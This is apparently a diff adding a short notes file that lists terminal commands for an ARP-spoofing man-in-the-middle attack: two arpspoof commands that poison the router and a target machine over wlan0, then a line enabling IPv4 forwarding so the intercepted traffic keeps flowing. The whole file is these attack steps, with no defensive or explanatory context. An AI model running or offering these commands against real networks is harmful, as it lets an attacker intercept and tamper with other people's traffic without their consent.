@@ -1,0 +1,9 @@
+###In first window
+
+#arpspoof -i wlan0 -t #RouterIP #TargetIP 
+
+##Open another terminal window and:
+#arpspoof -i wlan0 -t #TargetIP #RouterIP
+
+##Enable port forwarding in third window
+#echo 1 > /proc/sys/net/ipv4/ip_forward
